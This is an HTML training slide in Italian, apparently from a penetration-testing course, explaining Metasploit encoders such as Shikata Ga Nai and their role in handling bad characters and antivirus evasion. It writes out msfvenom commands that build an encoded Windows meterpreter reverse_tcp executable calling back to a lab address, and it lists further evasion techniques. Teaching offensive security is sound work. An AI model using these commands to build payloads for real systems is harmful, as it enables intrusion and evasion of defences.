@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>Encoders in Metasploit</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="nav-buttons">
+        <div class="nav-btn" id="nav-menu"><svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></div>
+        <div class="nav-btn" id="nav-prev"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg></div>
+        <div class="nav-btn" id="nav-next"><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
+    </div>
+
+    <div class="container">
+        <h1 class="title">🔐 Encoders in Metasploit</h1>
+        <div class="subtitle">Evasione AV e gestione bad characters</div>
+
+        <div class="card border-blue" style="margin-bottom: 25px;">
+            <div class="card-title">🎯 Ruolo degli Encoders</div>
+            <div class="card-text">
+                <p>Gli <strong>Encoders</strong> hanno assistito per oltre 15 anni nel rendere i payload compatibili con diverse architetture e nell'evasione antivirus.</p>
+                <br>
+                <p><strong>Obiettivi principali:</strong></p>
+                <ul style="margin-top: 10px; line-height: 1.8;">
+                    <li>📐 <strong>Compatibilità architetture:</strong> x64, x86, SPARC, PPC, MIPS</li>
+                    <li>🚫 <strong>Rimuovere bad characters:</strong> Opcode esadecimali problematici</li>
+                    <li>🛡️ <strong>Evasione AV:</strong> Modificare la signature del payload</li>
+                </ul>
+                <br>
+                <p style="color: #FFD54F;">⚠️ Nota: L'uso degli encoder solo per evasione AV è diminuito nel tempo, poiché gli IPS/IDS moderni hanno migliorato il detection delle signature.</p>
+            </div>
+        </div>
+
+        <div class="grid-2-col">
+            <div class="card border-purple">
+                <div class="card-title">🥋 Shikata Ga Nai (SGN)</div>
+                <div class="card-text">
+                    <p><strong>仕方がない</strong> - "Non si può fare niente"</p>
+                    <br>
+                    <p>È stato uno degli schemi di encoding più utilizzati perché i payload codificati tramite questo meccanismo erano molto difficili da rilevare.</p>
+                    <br>
+                    <p><strong>Caratteristiche:</strong></p>
+                    <ul style="margin-top: 10px; line-height: 1.8;">
+                        <li>Polymorphic XOR Additive Feedback</li>
+                        <li>Rank: <span class="tech-term">Excellent</span></li>
+                        <li>Più efficace con iterazioni multiple</li>
+                    </ul>
+                    <br>
+                    <p style="color: #F44336;">⚠️ Oggi i metodi di detection moderni hanno superato anche SGN. Non è più una soluzione universale!</p>
+                </div>
+            </div>
+
+            <div class="card border-green">
+                <div class="card-title">📋 Visualizzare Encoders</div>
+                <div class="card-text">
+                    <p>Dopo aver selezionato exploit e payload:</p>
+                    <div class="code-box">msf6 exploit(...) > show encoders
+
+Compatible Encoders
+===================
+   #  Name              Rank
+   -  ----              ----
+   0  generic/eicar     manual
+   1  generic/none      manual
+   2  x64/xor           manual
+   3  x64/xor_dynamic   manual
+   4  x64/zutto_dekiru  manual</div>
+                    <br>
+                    <p style="color: #4CAF50;">✅ Gli encoder mostrati sono compatibili con architettura target e payload selezionato.</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="card border-yellow" style="margin-top: 25px;">
+            <div class="card-title">🛠️ Uso con MSFvenom</div>
+            <div class="card-text">
+                <p><strong>Generare payload con encoder (singola iterazione):</strong></p>
+                <div class="code-box">$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
+  LHOST=10.10.14.5 LPORT=8080 \
+  -e x86/shikata_ga_nai \
+  -f exe -o payload.exe
+
+[*] x86/shikata_ga_nai succeeded with size 368 (iteration=0)
+Payload size: 368 bytes
+Saved as: payload.exe</div>
+                <br>
+                <p><strong>Con multiple iterazioni (più efficace):</strong></p>
+                <div class="code-box">$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
+  LHOST=10.10.14.5 LPORT=8080 \
+  -e x86/shikata_ga_nai -i 10 \
+  -f exe -o payload.exe
+
+[*] x86/shikata_ga_nai succeeded with size 368 (iteration=0)
+[*] x86/shikata_ga_nai succeeded with size 395 (iteration=1)
+[*] x86/shikata_ga_nai succeeded with size 422 (iteration=2)
+...
+[*] x86/shikata_ga_nai succeeded with size 611 (iteration=9)
+Payload size: 611 bytes</div>
+            </div>
+        </div>
+
+        <div class="card border-red" style="margin-top: 25px;">
+            <div class="card-title">⚠️ Realtà dell'Evasione AV</div>
+            <div class="card-text">
+                <p>Anche con 10 iterazioni di Shikata Ga Nai, i payload Metasploit standard vengono rilevati dalla maggior parte degli antivirus moderni.</p>
+                <br>
+                <p><strong>Approcci più efficaci:</strong></p>
+                <ul style="margin-top: 10px; line-height: 1.8;">
+                    <li>🔧 Payload custom scritti da zero</li>
+                    <li>🎭 Obfuscation avanzata del codice</li>
+                    <li>🔄 Packing e crypting professionale</li>
+                    <li>📦 Payload stageless con encryption personalizzata</li>
+                    <li>🚀 Tecniche di process injection avanzate</li>
+                </ul>
+                <br>
+                <p style="color: #FFD54F;">💡 Gli encoder sono utili per gestire bad characters, non più una soluzione completa per AV evasion.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>const slideNumero = 19;</script>
+    <script src="main.js"></script>
+</body>
+</html>
